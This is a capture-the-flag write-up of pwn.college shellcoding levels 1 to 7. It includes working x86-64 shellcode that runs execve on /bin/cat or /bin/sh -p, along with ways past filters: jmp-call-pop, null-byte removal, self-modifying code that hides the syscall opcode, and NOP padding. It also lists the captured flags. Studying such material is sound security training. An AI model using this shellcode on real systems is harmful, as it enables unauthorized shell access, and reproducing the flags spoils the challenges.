# Level 1

This challenge seems to have no restrictions, perhaps is the size but 0x4000 is extremelly high to be a constraint tho xD <br>

This could've been done several ways, i just used execve to call cat on the flag file <br>

- since flag was at the root directory, prepended with **/** to maintain stack aligned (this is allowed in linux)

```assembly
.global _start
_start:
.intel_syntax noprefix
    # int3 # to debug
	xor rax,rax
	push rax                    # null byte
	
arraybuilder: # right to left
	mov rdx, 0x67616c662f2f2f2f # ////flag reversed
	push rdx
	mov rdx, rsp
	push rax                    # null byte
	
	# store argv[0] -> cat
	mov rdi, 0x7461632f6e69622f # /bin/cat reversed
	push rdi
	mov rdi, rsp
	push rax                    # null byte

setregisters:
	push rdx                    # argv[1]
	push rdi                    # argv[0]
	
dosyscall:
	mov rsi, rsp                # argv **
	xor rdx,rdx                 # null envp
	add rax, 0x3b               # execve syscall index
	syscall

# Flag for teaching challenge -> pwn_college{A5TLoc-81Kcc3xGPcVXnvg_w3iH.QXxATMsQjNxIzW}
# Flag for testing challenge -> pwn_college{0YXOfsP5dgQkeEl0WcdpxPFAe7C.QXyATMsQjNxIzW}
```

# Level 2

Well, i did not found any impactfull restriction when analyzing the challenge's binary so i used the same shellcode to solve this one

```bash
# Flag for teaching challenge -> pwn_college{YftnkNfRTPXng39pds1tT4N2EOx.QXzATMsQjNxIzW}
# Flag for testing challenge -> pwn_college{Acyc0GHdtE2cqwWNgPfLUBTfVJQ.QX0ATMsQjNxIzW}
```

# Level 3

This level restricts the byte **0x48** which, after further research represents the **,** in the instructions ! <br>

This can also be seen with a quick opcode cheking using objdump

```assembly
401000:       48 31 c0                xor    rax,rax   					# Has byte 48
401003:       50                      push   rax						# Does not has byte 48

; -- snip --
401012:       50                      push   rax						# Does not has byte 48
401013:       48 bf 2f 62 69 6e 2f    movabs rdi,0x7461632f6e69622f		# Has the byte 48
```

It continues to happen in the remaining instructions <br>

Solution? Push-pop strategy is what is needed!! I'll also use execve("/bin/sh", ["/bin/sh", "-p"], NULL) to simplify the strings stuff<br>

Since we cant push QWORDS directly to the stack, and we need atleast an 8 bytes one for //bin/sh, we need to use a technique called **jmp-call-pop** which will solve that problem.

```assembly
.global _start
_start:
.intel_syntax noprefix
	# execve syscall with call jmp-call-pop trick
	jmp tricky
fake:
	pop rdi			# get the string address to filename
	
	push 0x0
	push 0x702d		# -p string reversed
	push rsp		# save -p string address
	pop rdx			# save -p address in rdx
	push 0x0		# start argv** build
	push rdx		# push -p address
	push rdi		# push //bin/sh address
	push rsp		# push the stack address
	pop rsi			# get the address to **argv into rsi

	push 0x0 		# clear rdx -> envp
	pop rdx
	push 0x3b 		# set syscall to execve
	pop rax	
	syscall	  		# exec syscall

tricky:
	#int3 # debug
	call fake		# this will put //bin/sh on top of the stack, and call fake section
	.string "//bin/sh"

# Flag for teaching challenge -> pwn_college{M_xf4eEjkb-U16q7T1imJI4Vp-Y.QX1ATMsQjNxIzW}
# Flag for testing challenge -> pwn_college{gHOOsJy9AabHpxm-S1PAzW18fRr.QX2ATMsQjNxIzW}
```

# Level 4

This challenge requires that we dont have null bytes in our shell code ! <br>

We can reuse most of our previous code, but we need to tweak the null terminators (direct pushing 0x0 produces null bytes) as well as the "-p" string value (which is zero extented to WORD size) <br>

We can see that with objdump 
```assembly
cmd: objdump -d -M intel shell.elf

401003:       6a 00                   push   0x0 
401005:       68 2d 70 00 00          push   0x702d
```

How to solve those?! 
1. -p : pad it with spaces (0x20)
2. push 0x0 : xor a register and push the register

The remaining code can stay unchanged (although we dont have the **,** restriction). We can also use the shellcode unmodified from the first level (that was what i used tho)! 
```bash
# Flag for teaching challenge -> pwn_college{k5ORJpaxssEtm4bRDdxXCR5Tkly.QX4ATMsQjNxIzW}
# Flag for testing challenge -> pwn_college{AjxME0aTejECnEOD_KZdtjbo2hQ.QX5ATMsQjNxIzW} 
```

# Level 5

From the binary output

```s
This challenge requires that your shellcode does not have any 'syscall',                   
'sysenter', or 'int' instructions. System calls are too dangerous!                         

This filter works by scanning through the shellcode for the following
byte sequences:

- 0f05 for 'syscall'
- 0f34 for 'sysenter'
- 80cd for 'int'
```

I never wrote self modifying code, let alone shellcode. But the general idea i have is: If it is blocking **0x0f05**, we can set some portion of the code as **0x0f04** and **inc** it <br>

What i did is pretty straight forward:
1. replace the **sycall** instruction with a label
2. Since the instruction has 2 bytes (0f 05), we need to add 2 NOP's (90 90) below that label
   1. This is not strictly needed (in this case it was not) but i imagine that it will clobber the instructions after the self-modified one 
3. Remember endianess !! The opcode is 0f05 but we need to send it in **05 0f** form

**Note:** The code below only comprises the modifications relative to the code used in the prior level

```assembly 

; -- snip --
dosyscall:
	mov dword ptr [rip+smc], 0x040f  # set smc to 0x040f which results in 0x0f 0x04 in memory
	inc dword ptr [rip+smc+1] 		 # increment the second byte after the label 0x04 -> 0x05
smc:
	nop
	nop 

# Flag for teaching challenge -> pwn_college{Aasg-O_V8qTaOx3OtKjMC4q0DWK.QXwETMsQjNxIzW} 
# Flag for testing challenge -> pwn_college{QLPeXbXoInxm_t-7mqgD84V7I-B.QXxETMsQjNxIzW}
```

# Level 6

This challenge is trickier. Although the same restrictions as before are applied (opcode filtering) now the memory page where the shellcode is read into, is not writable <br>

Since the binary is not using ASLR, we can just see if there is any memory page we can write into
```s

# with a breakpoint we can see where the code is stored at
"Shellcode start" @ 0x1337001

cmd (within GDB with gef plugin): vmmap
0x0000000001337000 0x0000000001338000 0x0000000000000000 r-x
0x0000000001338000 0x0000000001339000 0x0000000000000000 rwx
```

So we can see that the page right after can be **r**ead, **w**ritten and e**x**ecuted lets change the prior **mov** to the label, to the **0x1338000** page <br>

After that, we need to make **RIP** point there. I tried modifying RIP directly but that didn't work so i used a little trick with other register to force it: With a **JMP**

```assembly
; -- snip --

mov dword ptr [0x1338000], 0x040f
inc dword ptr [0x1338000+1]			# change the 0x04 byte to 0x05
xor r10, r10 						# should be 0, but never trust
mov r10, 0x1338000					# set r10 with syscall's instruction address
jmp r10								# make RIP point there


# Flag for teaching challenge -> pwn_college{cZ_FsKg24fehQvb2l3NJCIeXU6t.QXyETMsQjNxIzW}
# Flag for testing challenge -> pwn_college{oR3OsjWf_CmvgJYDebMNWwuHAXc.QXzETMsQjNxIzW}
```

# Level 7

This level will start executing at 0x800 bytes into the shellcode... <br>

We can't do much besides prepend junk to the shellcode with nops (or other type of junk) but 0x800 nops is a pain in the ass, god damn <br>

I just used a couple of commands to achieve that
```bash
# removed this from the shell.s file
.global _start
_start:
.intel_syntax noprefix

# created a file with it called nops
# used inline python to append 0x800 nops to that file
cmd: python -c 'print("nop\n"*int("0x800", 16))' >> nops
cmd: less nops
.global _start
_start:
.intel_syntax noprefix
nop
nop
nop
# -- snip --

# concat both files into junked.s
cmd: cat nops shell.s > junked.s
```

And it worked !! 
```bash
# Flag for teaching challenge -> pwn_college{QvW-0KwvDPIi_-L_hXDK-AEfnli.QX0ETMsQjNxIzW}
# Flag for testing challenge -> pwn_college{A3uI4CzODJ59Pn7B-tgx3mtc4PV.QX1ETMsQjNxIzW}
```
